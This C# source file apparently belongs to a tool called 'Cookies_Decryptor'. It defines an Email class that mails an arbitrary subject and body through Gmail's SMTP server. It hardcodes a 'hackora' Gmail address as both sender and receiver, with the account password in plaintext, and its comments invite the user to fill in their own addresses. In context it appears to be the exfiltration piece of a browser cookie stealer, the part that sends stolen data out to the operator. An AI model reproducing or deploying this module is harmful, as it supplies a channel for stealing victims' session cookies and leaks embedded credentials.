using System.Net;
using System.Net.Mail;


namespace Cookies_Decryptor
{
    internal static class Email
    {
        public static void Send(string subject, string body)
        {

            var fromAddress = new MailAddress("hackora122@gmail.com", "Hackora"); // -> put sender email here
            var toAddress = new MailAddress("hackora122@gmail.com", "Hackora"); // -> put receiver email here
            const string fromPassword = "TestIgnore2"; // -> put sender password here

            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            };
            using (var message = new MailMessage(fromAddress, toAddress)
            {

                Subject = subject,
                Body = body

            })
            {
                //message.To.Add("AddEmail@Example.com"); // -> if you want add more emails
                smtp.Send(message);
            }


        }

    }
}